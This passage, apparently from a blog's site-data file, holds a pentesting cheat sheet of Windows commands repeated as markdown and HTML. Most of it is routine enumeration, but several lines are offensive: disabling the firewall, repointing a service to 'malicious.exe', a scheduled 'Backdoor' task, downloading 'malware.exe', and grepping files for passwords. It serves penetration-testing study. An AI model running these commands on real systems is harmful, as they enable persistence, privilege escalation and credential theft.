SSH\" protocol=TCP dir=in localport=22 action=allow  REM Add a firewall rule to allow SSH on port 22\n```\n\n<br>\n\n### Shares with `net`\n```bat\nnet share                                REM List all shared folders on the local machine\nnet view \\\\hostname                       REM List shared resources on a remote machine\nnet use Z: \\\\hostname\\sharename /user:username password  REM Map a network drive using specific credentials\n```\n\n<br>\n\n### `smbclient` for SMB Connections (from Linux/Windows with Cygwin)\n```bat\nsmbclient -L \\\\hostname -U username       REM List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  REM Connect to a specific share\n```\n\n<br>\n\n### `powershell` Networking\n```bat\npowershell \"Test-Connection -ComputerName hostname -Count 4\"  REM Ping a host 4 times using PowerShell\npowershell \"Get-NetTCPConnection -State Listen\"  REM List all listening ports using PowerShell\npowershell \"Invoke-WebRequest -Uri http://example.com\"  REM Make a web request using PowerShell\n```\n\n<br>\n\n## Services\n\n### Service Management with `sc`\n```bat\nsc query <service_name>                   REM Query the status of a service\nsc qc <service_name>                      REM Query the service configuration (useful for finding paths and weak permissions)\nsc stop <service_name>                    REM Stop a service\nsc start <service_name>                   REM Start a service\nsc config <service_name> binPath= \"C:\\path\\to\\malicious.exe\"  REM Change the executable path for a service (privilege escalation technique)\nsc delete <service_name>                  REM Delete a service\n```\n\n<br>\n\n### Windows Services with `wmic`\n\n```bat\nwmic service get name, displayname, startmode, state  REM List all services, their display names, start modes, and current states\nwmic process where \"name='svchost.exe'\" get processid, commandline  REM List all instances of svchost with their command lines\n```\n\n<br>\n\n## Task Management\n\n### Process Management with `tasklist` and `taskkill`\n```bat\ntasklist                                  REM List all running processes\ntasklist /svc                             REM List services hosted in each svchost process\ntasklist /v                               REM Display detailed information about each process, including window title\ntaskkill /PID <PID>                       REM Kill a process by PID\ntaskkill /IM <process_name>               REM Kill a process by name\ntaskkill /F /PID <PID>                    REM Forcefully kill a process by PID\n```\n\n<br>\n\n### Scheduling Tasks with `schtasks`\n```bat\nschtasks /query /fo LIST /v               REM List all scheduled tasks with detailed information\nschtasks /create /tn \"Backdoor\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 12:00  REM Create a scheduled task to run a malicious file daily at noon\nschtasks /delete /tn \"TaskName\" /f        REM Delete a scheduled task by name, without prompting for confirmation\n```\n\n<br>\n\n## PowerShell - Advanced Commands\n\n### File and Directory Enumeration\n```bat\nGet-ChildItem -Recurse -Force | Where-Object { $_.Attributes -match \"Hidden\" }  REM List all hidden files recursively\nGet-Acl C:\\path\\to\\file.txt | Format-List  REM Get detailed ACL information for a specific file\n```\n\n<br>\n\n### Downloading Files\n```bat\nInvoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\path\\to\\malware.exe  REM Download a file from a URL and save it locally\n```\n\n<br>\n\n### Running Commands Remotely\n```bat\nInvoke-Command -ComputerName hostname -ScriptBlock { Get-Service }  REM Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  REM Establish an interactive session with a remote computer\n```\n\n<br>\n\n## Miscellaneous\n\n### Environment Variables\n```bat\nset                                        REM List all environment variables\nsetx VAR_NAME \"Value\"                      REM Set a new environment variable permanently\nset path=C:\\newpath;%path%                 REM Temporarily modify the PATH environment variable\n```\n\n<br>\n\n### System Control\n```bat\nshutdown /s /f /t 0                        REM Shutdown the computer immediately\nshutdown /r /f /t 0                        REM Restart the computer immediately\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/good-commands.md","raw":"---\ntitle: Windows - Commands - part 2\ndate: 2024-08-03 12:00:00\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\ntoc: true\n---\n\n---\n.\n\n---\n<!-- more -->\n\n## General Information\n\n### User Information\n```bat\necho %username%                         REM Display the current username\nwhoami /all                             REM Show detailed user information, groups, privileges, and SID\nnet user                                REM List all user accounts on the local machine\nnet localgroup administrators           REM List members of the Administrators group\n```\n```bat\nwhoami /priv                            REM View privileges - look for SeImpersonaPrivilege - potato\n```\n\n<br>\n\n### System Information\n```bat\nsysteminfo                              REM Display detailed system configuration, OS version, etc.\nwmic qfe list brief /format:table       REM List installed hotfixes and patches\nwmic os get caption, version, csname    REM Display the Windows version, OS name, and computer name\nwmic product get name, version          REM List all installed software with versions (useful for finding vulnerable software)\n```\n\n<br>\n\n### Registry Information\n```bat\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               REM List programs set to run at startup\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer  REM Check proxy settings\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous  REM Check if anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  REM Check if MSI packages can be installed with elevated privileges\n```\n\n<br>\n\n## Filesystem\n\n## Drivers\n```batch\nfsutil fsinfo drives      REM View drivers available\n```\n\n### Directory and File Operations with `dir`\n```bat\ndir /A:D                                 REM List directories only\ndir /A:HS                                REM List hidden and system files\ndir /O:S                                 REM Sort files by size\ndir /Q                                   REM Show file owners\ndir /T:C                                 REM Show creation time\ndir /S /B                                REM Recursive search, bare format (useful for finding specific files like passwords or sensitive documents)\n```\n\n<br>\n\n### File Searching with `findstr`\n```bat\nfindstr /si \"password\" *.txt             REM Search for the word \"password\" in all .txt files (case-insensitive)\nfindstr /R /S \"regex_pattern\" *.config   REM Search using regular expressions across all .config files recursively\n```\n\n<br>\n\n### File and Directory Takeover\n```bat\ntakeown /F <file_or_folder> /A           REM Take ownership of a file or folder\nicacls <file_or_folder> /grant %username%:F  REM Grant full control to the current user\n```\n\n<br>\n\n## Permissions\n\n### `icacls` - Managing Permissions\n```bat\nicacls <file_or_folder>                   REM Show permissions for a file or folder\nicacls <file_or_folder> /grant <user>:(F) REM Grant full control to a user\nicacls <file_or_folder> /deny <user>:(D)  REM Deny delete permissions to a user\nicacls <file_or_folder> /inheritance:e    REM Enable inheritance for a file or folder\nicacls <file_or_folder> /save aclfile.txt REM Backup ACLs to a file\nicacls <file_or_folder> /restore aclfile.txt  REM Restore ACLs from a file\nicacls <file_or_folder> /reset            REM Reset permissions to default\n```\n```batch\nF    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it's executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory's contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.\n```\n\n<br>\n\n### Access Control with `accesschk`\n```bat\naccesschk.exe -uws <username> *           REM Show all objects with write access for a specific user (Sysinternals)\naccesschk.exe -p <processname>            REM Check permissions on a specific process (useful for privilege escalation)\n```\n\n<br>\n\n## Networking\n\n### Network Configuration with `ipconfig`\n```bat\nipconfig /all                             REM Display all network configuration\nipconfig /displaydns                      REM Show the DNS resolver cache\nipconfig /flushdns                        REM Flush DNS resolver cache (useful for clearing potential logs or testing DNS issues)\nipconfig /release                         REM Release the current IP address\nipconfig /renew                           REM Renew the IP address\n```\n\n<br>\n\n### Network Connections with `netstat`\n```bat\nnetstat -an                               REM Show all active connections and listening ports\nnetstat -b                                REM Show the executable tied to each connection\nnetstat -r                                REM Show the routing table\nnetstat -o                                REM Show active connections with the associated process ID (PID)\nnetstat -ano | findstr :80                REM Find connections on port 80\n```\n\n<br>\n\n### ARP Cache with `arp`\n```bat\narp -a                                    REM Show ARP cache\narp -d                                    REM Clear ARP cache\n```\n\n<br>\n\n### Windows Firewall with `netsh`\n```bat\nnetsh advfirewall show currentprofile     REM Display the active firewall profile settings\nnetsh advfirewall set currentprofile state off  REM Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=\"Allow SSH\" protocol=TCP dir=in localport=22 action=allow  REM Add a firewall rule to allow SSH on port 22\n```\n\n<br>\n\n### Shares with `net`\n```bat\nnet share                                REM List all shared folders on the local machine\nnet view \\\\hostname                       REM List shared resources on a remote machine\nnet use Z: \\\\hostname\\sharename /user:username password  REM Map a network drive using specific credentials\n```\n\n<br>\n\n### `smbclient` for SMB Connections (from Linux/Windows with Cygwin)\n```bat\nsmbclient -L \\\\hostname -U username       REM List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  REM Connect to a specific share\n```\n\n<br>\n\n### `powershell` Networking\n```bat\npowershell \"Test-Connection -ComputerName hostname -Count 4\"  REM Ping a host 4 times using PowerShell\npowershell \"Get-NetTCPConnection -State Listen\"  REM List all listening ports using PowerShell\npowershell \"Invoke-WebRequest -Uri http://example.com\"  REM Make a web request using PowerShell\n```\n\n<br>\n\n## Services\n\n### Service Management with `sc`\n```bat\nsc query <service_name>                   REM Query the status of a service\nsc qc <service_name>                      REM Query the service configuration (useful for finding paths and weak permissions)\nsc stop <service_name>                    REM Stop a service\nsc start <service_name>                   REM Start a service\nsc config <service_name> binPath= \"C:\\path\\to\\malicious.exe\"  REM Change the executable path for a service (privilege escalation technique)\nsc delete <service_name>                  REM Delete a service\n```\n\n<br>\n\n### Windows Services with `wmic`\n\n```bat\nwmic service get name, displayname, startmode, state  REM List all services, their display names, start modes, and current states\nwmic process where \"name='svchost.exe'\" get processid, commandline  REM List all instances of svchost with their command lines\n```\n\n<br>\n\n## Task Management\n\n### Process Management with `tasklist` and `taskkill`\n```bat\ntasklist                                  REM List all running processes\ntasklist /svc                             REM List services hosted in each svchost process\ntasklist /v                               REM Display detailed information about each process, including window title\ntaskkill /PID <PID>                       REM Kill a process by PID\ntaskkill /IM <process_name>               REM Kill a process by name\ntaskkill /F /PID <PID>                    REM Forcefully kill a process by PID\n```\n\n<br>\n\n### Scheduling Tasks with `schtasks`\n```bat\nschtasks /query /fo LIST /v               REM List all scheduled tasks with detailed information\nschtasks /create /tn \"Backdoor\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 12:00  REM Create a scheduled task to run a malicious file daily at noon\nschtasks /delete /tn \"TaskName\" /f        REM Delete a scheduled task by name, without prompting for confirmation\n```\n\n<br>\n\n## PowerShell - Advanced Commands\n\n### File and Directory Enumeration\n```bat\nGet-ChildItem -Recurse -Force | Where-Object { $_.Attributes -match \"Hidden\" }  REM List all hidden files recursively\nGet-Acl C:\\path\\to\\file.txt | Format-List  REM Get detailed ACL information for a specific file\n```\n\n<br>\n\n### Downloading Files\n```bat\nInvoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\path\\to\\malware.exe  REM Download a file from a URL and save it locally\n```\n\n<br>\n\n### Running Commands Remotely\n```bat\nInvoke-Command -ComputerName hostname -ScriptBlock { Get-Service }  REM Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  REM Establish an interactive session with a remote computer\n```\n\n<br>\n\n## Miscellaneous\n\n### Environment Variables\n```bat\nset                                        REM List all environment variables\nsetx VAR_NAME \"Value\"                      REM Set a new environment variable permanently\nset path=C:\\newpath;%path%                 REM Temporarily modify the PATH environment variable\n```\n\n<br>\n\n### System Control\n```bat\nshutdown /s /f /t 0                        REM Shutdown the computer immediately\nshutdown /r /f /t 0                        REM Restart the computer immediately\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/good-commands","published":1,"updated":"2024-09-23T06:18:55.876Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi4001q6gvgdid99egm","content":"<hr>\n<p>.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"General-Information\"><a href=\"#General-Information\" class=\"headerlink\" title=\"General Information\"></a>General Information</h2><h3 id=\"User-Information\"><a href=\"#User-Information\" class=\"headerlink\" title=\"User Information\"></a>User Information</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">echo</span> <span class=\"variable\">%username%</span>                         <span class=\"built_in\">REM</span> Display the current username\nwhoami /all                             <span class=\"built_in\">REM</span> Show detailed user information, groups, privileges, and SID\n<span class=\"built_in\">net</span> user                                <span class=\"built_in\">REM</span> List all user accounts on the local machine\n<span class=\"built_in\">net</span> localgroup administrators           <span class=\"built_in\">REM</span> List members of the Administrators group</code></pre>\n<pre><code class=\"highlight bat\">whoami /priv                            <span class=\"built_in\">REM</span> View privileges - look <span class=\"keyword\">for</span> SeImpersonaPrivilege - potato</code></pre>\n\n<br>\n\n<h3 id=\"System-Information\"><a href=\"#System-Information\" class=\"headerlink\" title=\"System Information\"></a>System Information</h3><pre><code class=\"highlight bat\">systeminfo                              <span class=\"built_in\">REM</span> Display detailed system configuration, OS version, etc.\nwmic qfe list brief /<span class=\"built_in\">format</span>:table       <span class=\"built_in\">REM</span> List installed hotfixes and patches\nwmic os get caption, version, csname    <span class=\"built_in\">REM</span> Display the Windows version, OS name, and computer name\nwmic product get name, version          <span class=\"built_in\">REM</span> List all installed software with versions (useful <span class=\"keyword\">for</span> finding vulnerable software)</code></pre>\n\n<br>\n\n<h3 id=\"Registry-Information\"><a href=\"#Registry-Information\" class=\"headerlink\" title=\"Registry Information\"></a>Registry Information</h3><pre><code class=\"highlight bat\">reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               <span class=\"built_in\">REM</span> List programs <span class=\"built_in\">set</span> to run <span class=\"built_in\">at</span> startup\nreg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; /v ProxyServer  <span class=\"built_in\">REM</span> Check proxy settings\nreg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RestrictAnonymous  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> MSI packages can be installed with elevated privileges</code></pre>\n\n<br>\n\n<h2 id=\"Filesystem\"><a href=\"#Filesystem\" class=\"headerlink\" title=\"Filesystem\"></a>Filesystem</h2><h2 id=\"Drivers\"><a href=\"#Drivers\" class=\"headerlink\" title=\"Drivers\"></a>Drivers</h2><pre><code class=\"highlight batch\">fsutil fsinfo drives      REM View drivers available</code></pre>\n\n<h3 id=\"Directory-and-File-Operations-with-dir\"><a href=\"#Directory-and-File-Operations-with-dir\" class=\"headerlink\" title=\"Directory and File Operations with dir\"></a>Directory and File Operations with <code>dir</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">dir</span> /A:D                                 <span class=\"built_in\">REM</span> List directories only\n<span class=\"built_in\">dir</span> /A:HS                                <span class=\"built_in\">REM</span> List hidden and system files\n<span class=\"built_in\">dir</span> /O:S                                 <span class=\"built_in\">REM</span> <span class=\"built_in\">Sort</span> files by size\n<span class=\"built_in\">dir</span> /Q                                   <span class=\"built_in\">REM</span> Show file owners\n<span class=\"built_in\">dir</span> /T:C                                 <span class=\"built_in\">REM</span> Show creation <span class=\"built_in\">time</span>\n<span class=\"built_in\">dir</span> /S /B                                <span class=\"built_in\">REM</span> Recursive search, bare <span class=\"built_in\">format</span> (useful <span class=\"keyword\">for</span> finding specific files like passwords or sensitive documents)</code></pre>\n\n<br>\n\n<h3 id=\"File-Searching-with-findstr\"><a href=\"#File-Searching-with-findstr\" class=\"headerlink\" title=\"File Searching with findstr\"></a>File Searching with <code>findstr</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">findstr</span> /si &quot;password&quot; *.txt             <span class=\"built_in\">REM</span> Search <span class=\"keyword\">for</span> the word &quot;password&quot; <span class=\"keyword\">in</span> all .txt files (case-insensitive)\n<span class=\"built_in\">findstr</span> /R /S &quot;regex_pattern&quot; *.config   <span class=\"built_in\">REM</span> Search using regular expressions across all .config files recursively</code></pre>\n\n<br>\n\n<h3 id=\"File-and-Directory-Takeover\"><a href=\"#File-and-Directory-Takeover\" class=\"headerlink\" title=\"File and Directory Takeover\"></a>File and Directory Takeover</h3><pre><code class=\"highlight bat\">takeown /F &lt;file_or_folder&gt; /A           <span class=\"built_in\">REM</span> Take ownership of a file or folder\nicacls &lt;file_or_folder&gt; /grant <span class=\"variable\">%username%</span>:F  <span class=\"built_in\">REM</span> Grant full control to the current user</code></pre>\n\n<br>\n\n<h2 id=\"Permissions\"><a href=\"#Permissions\" class=\"headerlink\" title=\"Permissions\"></a>Permissions</h2><h3 id=\"icacls-Managing-Permissions\"><a href=\"#icacls-Managing-Permissions\" class=\"headerlink\" title=\"icacls - Managing Permissions\"></a><code>icacls</code> - Managing Permissions</h3><pre><code class=\"highlight bat\">icacls &lt;file_or_folder&gt;                   <span class=\"built_in\">REM</span> Show permissions <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /grant &lt;user&gt;:(F) <span class=\"built_in\">REM</span> Grant full control to a user\nicacls &lt;file_or_folder&gt; /deny &lt;user&gt;:(D)  <span class=\"built_in\">REM</span> Deny delete permissions to a user\nicacls &lt;file_or_folder&gt; /inheritance:e    <span class=\"built_in\">REM</span> Enable inheritance <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /save aclfile.txt <span class=\"built_in\">REM</span> Backup ACLs to a file\nicacls &lt;file_or_folder&gt; /<span class=\"built_in\">restore</span> aclfile.txt  <span class=\"built_in\">REM</span> <span class=\"built_in\">Restore</span> ACLs from a file\nicacls &lt;file_or_folder&gt; /reset            <span class=\"built_in\">REM</span> Reset permissions to default</code></pre>\n<pre><code class=\"highlight batch\">F    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it&#x27;s executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory&#x27;s contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.</code></pre>\n\n<br>\n\n<h3 id=\"Access-Control-with-accesschk\"><a href=\"#Access-Control-with-accesschk\" class=\"headerlink\" title=\"Access Control with accesschk\"></a>Access Control with <code>accesschk</code></h3><pre><code class=\"highlight bat\">accesschk.exe -uws &lt;username&gt; *           <span class=\"built_in\">REM</span> Show all objects with write access <span class=\"keyword\">for</span> a specific user (Sysinternals)\naccesschk.exe -p &lt;processname&gt;            <span class=\"built_in\">REM</span> Check permissions on a specific process (useful <span class=\"keyword\">for</span> privilege escalation)</code></pre>\n\n<br>\n\n<h2 id=\"Networking\"><a href=\"#Networking\" class=\"headerlink\" title=\"Networking\"></a>Networking</h2><h3 id=\"Network-Configuration-with-ipconfig\"><a href=\"#Network-Configuration-with-ipconfig\" class=\"headerlink\" title=\"Network Configuration with ipconfig\"></a>Network Configuration with <code>ipconfig</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">ipconfig</span> /all                             <span class=\"built_in\">REM</span> Display all network configuration\n<span class=\"built_in\">ipconfig</span> /displaydns                      <span class=\"built_in\">REM</span> Show the DNS resolver cache\n<span class=\"built_in\">ipconfig</span> /flushdns                        <span class=\"built_in\">REM</span> Flush DNS resolver cache (useful <span class=\"keyword\">for</span> clearing potential logs or testing DNS issues)\n<span class=\"built_in\">ipconfig</span> /release                         <span class=\"built_in\">REM</span> Release the current IP address\n<span class=\"built_in\">ipconfig</span> /renew                           <span class=\"built_in\">REM</span> Renew the IP address</code></pre>\n\n<br>\n\n<h3 id=\"Network-Connections-with-netstat\"><a href=\"#Network-Connections-with-netstat\" class=\"headerlink\" title=\"Network Connections with netstat\"></a>Network Connections with <code>netstat</code></h3><pre><code class=\"highlight bat\">netstat -an                               <span class=\"built_in\">REM</span> Show all active connections and listening ports\nnetstat -b                                <span class=\"built_in\">REM</span> Show the executable tied to each connection\nnetstat -r                                <span class=\"built_in\">REM</span> Show the routing table\nnetstat -o                                <span class=\"built_in\">REM</span> Show active connections with the associated process ID (PID)\nnetstat -ano | <span class=\"built_in\">findstr</span> :<span class=\"number\">80</span>                <span class=\"built_in\">REM</span> <span class=\"built_in\">Find</span> connections on port <span class=\"number\">80</span></code></pre>\n\n<br>\n\n<h3 id=\"ARP-Cache-with-arp\"><a href=\"#ARP-Cache-with-arp\" class=\"headerlink\" title=\"ARP Cache with arp\"></a>ARP Cache with <code>arp</code></h3><pre><code class=\"highlight bat\">arp -a                                    <span class=\"built_in\">REM</span> Show ARP cache\narp -d                                    <span class=\"built_in\">REM</span> Clear ARP cache</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Firewall-with-netsh\"><a href=\"#Windows-Firewall-with-netsh\" class=\"headerlink\" title=\"Windows Firewall with netsh\"></a>Windows Firewall with <code>netsh</code></h3><pre><code class=\"highlight bat\">netsh advfirewall show currentprofile     <span class=\"built_in\">REM</span> Display the active firewall profile settings\nnetsh advfirewall <span class=\"built_in\">set</span> currentprofile state off  <span class=\"built_in\">REM</span> Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=&quot;Allow SSH&quot; protocol=TCP <span class=\"built_in\">dir</span>=<span class=\"keyword\">in</span> localport=<span class=\"number\">22</span> action=allow  <span class=\"built_in\">REM</span> Add a firewall rule to allow SSH on port <span class=\"number\">22</span></code></pre>\n\n<br>\n\n<h3 id=\"Shares-with-net\"><a href=\"#Shares-with-net\" class=\"headerlink\" title=\"Shares with net\"></a>Shares with <code>net</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">net</span> share                                <span class=\"built_in\">REM</span> List all shared folders on the local machine\n<span class=\"built_in\">net</span> view \\\\hostname                       <span class=\"built_in\">REM</span> List shared resources on a remote machine\n<span class=\"built_in\">net</span> use Z: \\\\hostname\\sharename /user:username password  <span class=\"built_in\">REM</span> Map a network drive using specific credentials</code></pre>\n\n<br>\n\n<h3 id=\"smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\"><a href=\"#smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\" class=\"headerlink\" title=\"smbclient for SMB Connections (from Linux&#x2F;Windows with Cygwin)\"></a><code>smbclient</code> for SMB Connections (from Linux&#x2F;Windows with Cygwin)</h3><pre><code class=\"highlight bat\">smbclient -L \\\\hostname -U username       <span class=\"built_in\">REM</span> List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  <span class=\"built_in\">REM</span> Connect to a specific share</code></pre>\n\n<br>\n\n<h3 id=\"powershell-Networking\"><a href=\"#powershell-Networking\" class=\"headerlink\" title=\"powershell Networking\"></a><code>powershell</code> Networking</h3><pre><code class=\"highlight bat\">powershell &quot;Test-Connection -ComputerName hostname -Count <span class=\"number\">4</span>&quot;  <span class=\"built_in\">REM</span> <span class=\"built_in\">Ping</span> a host <span class=\"number\">4</span> times using PowerShell\npowershell &quot;Get-NetTCPConnection -State Listen&quot;  <span class=\"built_in\">REM</span> List all listening ports using PowerShell\npowershell &quot;Invoke-WebRequest -Uri http://example.com&quot;  <span class=\"built_in\">REM</span> Make a web request using PowerShell</code></pre>\n\n<br>\n\n<h2 id=\"Services\"><a href=\"#Services\" class=\"headerlink\" title=\"Services\"></a>Services</h2><h3 id=\"Service-Management-with-sc\"><a href=\"#Service-Management-with-sc\" class=\"headerlink\" title=\"Service Management with sc\"></a>Service Management with <code>sc</code></h3><pre><code class=\"highlight bat\">sc query &lt;service_name&gt;                   <span class=\"built_in\">REM</span> Query the status of a service\nsc qc &lt;service_name&gt;                      <span class=\"built_in\">REM</span> Query the service configuration (useful <span class=\"keyword\">for</span> finding paths and weak permissions)\nsc stop &lt;service_name&gt;                    <span class=\"built_in\">REM</span> Stop a service\nsc <span class=\"built_in\">start</span> &lt;service_name&gt;                   <span class=\"built_in\">REM</span> <span class=\"built_in\">Start</span> a service\nsc config &lt;service_name&gt; binPath= &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot;  <span class=\"built_in\">REM</span> Change the executable <span class=\"built_in\">path</span> <span class=\"keyword\">for</span> a service (privilege escalation technique)\nsc delete &lt;service_name&gt;                  <span class=\"built_in\">REM</span> Delete a service</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Services-with-wmic\"><a href=\"#Windows-Services-with-wmic\" class=\"headerlink\" title=\"Windows Services with wmic\"></a>Windows Services with <code>wmic</code></h3><pre><code class=\"highlight bat\">wmic service get name, displayname, startmode, state  <span class=\"built_in\">REM</span> List all services, their display names, <span class=\"built_in\">start</span> modes, and current states\nwmic process where &quot;name=&#x27;svchost.exe&#x27;&quot; get processid, commandline  <span class=\"built_in\">REM</span> List all instances of svchost with their command lines</code></pre>\n\n<br>\n\n<h2 id=\"Task-Management\"><a href=\"#Task-Management\" class=\"headerlink\" title=\"Task Management\"></a>Task Management</h2><h3 id=\"Process-Management-with-tasklist-and-taskkill\"><a href=\"#Process-Management-with-tasklist-and-taskkill\" class=\"headerlink\" title=\"Process Management with tasklist and taskkill\"></a>Process Management with <code>tasklist</code> and <code>taskkill</code></h3><pre><code class=\"highlight bat\">tasklist                                  <span class=\"built_in\">REM</span> List all running processes\ntasklist /svc                             <span class=\"built_in\">REM</span> List services hosted <span class=\"keyword\">in</span> each svchost process\ntasklist /v                               <span class=\"built_in\">REM</span> Display detailed information about each process, including window <span class=\"built_in\">title</span>\n<span class=\"built_in\">taskkill</span> /PID &lt;PID&gt;                       <span class=\"built_in\">REM</span> Kill a process by PID\n<span class=\"built_in\">taskkill</span> /IM &lt;process_name&gt;               <span class=\"built_in\">REM</span> Kill a process by name\n<span class=\"built_in\">taskkill</span> /F /PID &lt;PID&gt;                    <span class=\"built_in\">REM</span> Forcefully kill a process by PID</code></pre>\n\n<br>\n\n<h3 id=\"Scheduling-Tasks-with-schtasks\"><a href=\"#Scheduling-Tasks-with-schtasks\" class=\"headerlink\" title=\"Scheduling Tasks with schtasks\"></a>Scheduling Tasks with <code>schtasks</code></h3><pre><code class=\"highlight bat\">schtasks /query /fo LIST /v               <span class=\"built_in\">REM</span> List all scheduled tasks with detailed information\nschtasks /create /tn &quot;Backdoor&quot; /tr &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot; /sc daily /st <span class=\"number\">12</span>:<span class=\"number\">00</span>  <span class=\"built_in\">REM</span> Create a scheduled task to run a malicious file daily <span class=\"built_in\">at</span> noon\nschtasks /delete /tn &quot;TaskName&quot; /f        <span class=\"built_in\">REM</span> Delete a scheduled task by name, without prompting <span class=\"keyword\">for</span> confirmation</code></pre>\n\n<br>\n\n<h2 id=\"PowerShell-Advanced-Commands\"><a href=\"#PowerShell-Advanced-Commands\" class=\"headerlink\" title=\"PowerShell - Advanced Commands\"></a>PowerShell - Advanced Commands</h2><h3 id=\"File-and-Directory-Enumeration\"><a href=\"#File-and-Directory-Enumeration\" class=\"headerlink\" title=\"File and Directory Enumeration\"></a>File and Directory Enumeration</h3><pre><code class=\"highlight bat\">Get-ChildItem -Recurse -Force | Where-Object &#123; $_.Attributes -match &quot;Hidden&quot; &#125;  <span class=\"built_in\">REM</span> List all hidden files recursively\nGet-Acl C:\\<span class=\"built_in\">path</span>\\to\\file.txt | <span class=\"built_in\">Format</span>-List  <span class=\"built_in\">REM</span> Get detailed ACL information <span class=\"keyword\">for</span> a specific file</code></pre>\n\n<br>\n\n<h3 id=\"Downloading-Files\"><a href=\"#Downloading-Files\" class=\"headerlink\" title=\"Downloading Files\"></a>Downloading Files</h3><pre><code class=\"highlight bat\">Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\<span class=\"built_in\">path</span>\\to\\malware.exe  <span class=\"built_in\">REM</span> Download a file from a URL and save it locally</code></pre>\n\n<br>\n\n<h3 id=\"Running-Commands-Remotely\"><a href=\"#Running-Commands-Remotely\" class=\"headerlink\" title=\"Running Commands Remotely\"></a>Running Commands Remotely</h3><pre><code class=\"highlight bat\">Invoke-Command -ComputerName hostname -ScriptBlock &#123; Get-Service &#125;  <span class=\"built_in\">REM</span> Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  <span class=\"built_in\">REM</span> Establish an interactive session with a remote computer</code></pre>\n\n<br>\n\n<h2 id=\"Miscellaneous\"><a href=\"#Miscellaneous\" class=\"headerlink\" title=\"Miscellaneous\"></a>Miscellaneous</h2><h3 id=\"Environment-Variables\"><a href=\"#Environment-Variables\" class=\"headerlink\" title=\"Environment Variables\"></a>Environment Variables</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">set</span>                                        <span class=\"built_in\">REM</span> List all environment variables\nsetx VAR_NAME &quot;Value&quot;                      <span class=\"built_in\">REM</span> <span class=\"built_in\">Set</span> a new environment variable permanently\n<span class=\"built_in\">set</span> <span class=\"built_in\">path</span>=C:\\newpath;<span class=\"variable\">%path%</span>                 <span class=\"built_in\">REM</span> Temporarily modify the <span class=\"built_in\">PATH</span> environment variable</code></pre>\n\n<br>\n\n<h3 id=\"System-Control\"><a href=\"#System-Control\" class=\"headerlink\" title=\"System Control\"></a>System Control</h3><pre><code class=\"highlight bat\">shutdown /s /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Shutdown the computer immediately\nshutdown /r /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Restart the computer immediately</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>.</p>\n<hr>","more":"<h2 id=\"General-Information\"><a href=\"#General-Information\" class=\"headerlink\" title=\"General Information\"></a>General Information</h2><h3 id=\"User-Information\"><a href=\"#User-Information\" class=\"headerlink\" title=\"User Information\"></a>User Information</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">echo</span> <span class=\"variable\">%username%</span>                         